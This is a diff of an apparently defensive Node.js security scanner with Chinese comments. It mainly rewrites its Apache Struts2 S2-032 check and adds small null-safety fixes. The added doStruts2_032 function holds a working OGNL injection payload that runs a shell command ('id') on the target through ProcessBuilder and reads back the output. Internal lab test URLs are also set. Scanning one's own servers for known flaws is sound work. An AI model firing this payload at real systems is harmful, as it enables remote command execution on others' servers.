@@ -290,23 +290,7 @@ function doStruts2_046(url)
 		});
 	}catch(e){fnLog(e);}
 }
-/*
-// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
-在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，
-DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），
-这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会
-///////////*/
-function doStruts2_032(url)
-{
-	var oParms = {},s;
-	oParms[s = "method:" + encodeURIComponent(g_postData)] = "";
-	oParms["mtxtest"] = "ok";
-	request(fnOptHeader({method: 'POST',uri: url + "?" + s,"formData":oParms}),
-    	function(e,r,b)
-    {
-    	fnDoBody(b,"s2-032");
-    });
-}
+
 
 /*
 Spring WebFlow 远程代码执行漏洞(CVE-2017-4971)
@@ -483,7 +467,7 @@ function fnDoBody(body,t,rep)
 	if(-1 < body.indexOf("root") && !oT["root"])
 		oT["root"] = "中间件不应该用root启动，不符合公司上线检查表要求";
 	if(s1[0] && 50 > s1[0].length && !oT["user"])
-		oT["user"] = "当前中间件启动的用户：" + (-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
+		oT["user"] = "当前中间件启动的用户：" + String(-1 < s1[0].indexOf('whoami')? s1[1]:s1[0]).trim();
 	if(1 < s1.length)
 		oT["CurDir"] = {des:"当前中间件目录","path":(3 < s1.length ? s1[3] : s1[1]).trim()};
 }
@@ -682,6 +666,46 @@ function doStruts2_029(url, fnCbk,bW)
 	  		}
 	    }
 	  );
+}
+
+/*
+// payload = {'method:#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,#writer=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#writer.println(#parameters.tag[0]),#writer.flush(),#writer.close': '', 'tag': tag}
+在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，
+DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），
+这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会
+///////////*/
+function doStruts2_032(url)
+{
+	url = fnNotEnd(url);
+	var oParms = {},s;
+	// 测试证明，有些@要编码，有些不能编码
+	//s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString";
+	s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),"
+	+ "#c=new java.lang.ProcessBuilder(#parameters.cmd[0]),#p.redirectErrorStream(true),#process=#p.start()"
+	+ ",%23s%3dnew+java.util.Scanner(#process.getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString";
+
+
+	//s = "%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b555%2b12345),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=11602011"
+
+	//console.log(encodeURIComponent(s));
+
+	
+	// oParms[s = "method:" + encodeURIComponent(s)] = "";
+	// oParms["mtxtest"] = "ok";
+	var n = 12345 + 555 + 11602011;
+	request(fnOptHeader({method: 'GET',uri: url + "?method:" 
+		+ s
+	+ "&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id"// + encodeURIComponent(g_szCmd.replace(/;/gmi,"&&"))
+		}),
+    	function(e,r,b)
+    {
+    	var szTmp = String(e || b);
+    	console.log(szTmp);
+    	if(-1 < szTmp.indexOf('1160201155512345'))
+    		g_oRst.struts2 = {des:"发现s2-032高危漏洞","s2-032":"存在高危漏洞"};
+    	else fnDoBody(b,"s2-032");
+    });
+
 }
 
 // 测试所有，便于更改url重复测试
@@ -1286,7 +1310,7 @@ function testWeblogic(url,fnCbk)
 	});
 	request(fnOptHeader({method:"GET",uri:szCs2}),function(e,r,b)
 	{
-		if(200 == r.statusCode)
+		if(r && 200 == r.statusCode)
 		{
 			g_oRst.tomcat = {console:"发现manager可访问，不符合安全规范要求，建议关闭、设置访问限制"};
 		}
@@ -1360,16 +1384,15 @@ if(program.test)
 	console.log("开始内网测试");
 	// doStruts2_016("http://192.168.10.216:8088/S2-016/default.action");
  	
- 	doStruts2_029("http://127.0.0.1:8080/S2-029/default.action");
 	// doStruts2_005("http://192.168.10.216:8088/S2-005/example/HelloWorld.action");
 	
-	// doStruts2_032("http://192.168.10.216:8088/s2-032/login.jsp");
+	doStruts2_032("http://192.168.10.216:8088/s2-032/memoindex.action");
 	
 	/**
 	doStruts2_009(g_szUrl);
 	
 	// doStruts2_020(g_szUrl);
-	doStruts2_032(g_szUrl);
+	
 	doStruts2_033(g_szUrl);
 	doStruts2_037(g_szUrl);
 	doStruts2_DevMode(g_szUrl);
